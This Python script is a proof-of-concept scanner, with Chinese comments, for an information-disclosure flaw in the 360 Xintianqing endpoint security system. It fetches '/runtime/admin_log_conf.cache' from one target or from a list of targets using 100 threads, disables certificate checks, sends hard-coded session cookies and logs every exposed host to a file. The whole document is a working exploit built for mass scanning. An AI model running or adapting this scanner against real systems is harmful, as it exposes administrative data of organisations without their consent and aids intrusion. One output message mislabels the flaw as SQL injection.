#360新天擎终端安全系统信息泄露漏洞
#title="360新天擎"


import re,requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """
  __  __       _        _         _____ ______ _____ 
 |  \/  |     | |      (_)       / ____|  ____/ ____|
 | \  / | __ _| |_ _ __ ___  __ | (___ | |__ | |     
 | |\/| |/ _` | __| '__| \ \/ /  \___ \|  __|| |     
 | |  | | (_| | |_| |  | |>  <   ____) | |___| |____ 
 |_|  |_|\__,_|\__|_|  |_/_/\_\ |_____/|______\_____|
"""
    print(test)

def main():
    banner()

    parser = argparse.ArgumentParser(description = "360新天擎终端安全系统")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")

def poc(target):
    header = {
        'Cookie':'SKYLARd5542118ac801ee345b25f143c=iolbhddgg1nqqbmaisjhb5cb42; YII_CSRF_TOKEN=f926d1e0d5c3a255a44e202a480cf6317f621c66s%3A40%3A%22b97a2a429d0ff792c6c17e6ab55a8b3bd9289a97%22%3B',
        'Cache-Control':'max-age=0',
        'Sec-Ch-Ua':'"Chromium";v="121", "Not A(Brand";v="99"',
        'Sec-Ch-Ua-Mobile':'?0',
        'Sec-Ch-Ua-Platform':"Windows",
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site':'none',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-User':'?1',
        'Sec-Fetch-Dest':'document',
        'Accept-Encoding':'gzip, deflate, br',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Priority':'u=0, i',
        'Connection':'close'
    }
    payload = '/runtime/admin_log_conf.cache'
    url = target+payload
    try:
        res = requests.get(url=url,headers=header,verify=False)
        if res.status_code == 200:
            print(f"该url存在信息泄露漏洞{target}")
            with open('yync_result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]该站点{target}不存在sql注入漏洞")
    except Exception as e:
        print(f"[*]该站点{target}存在访问问题，请手工测试")
if __name__ == '__main__':
    main()
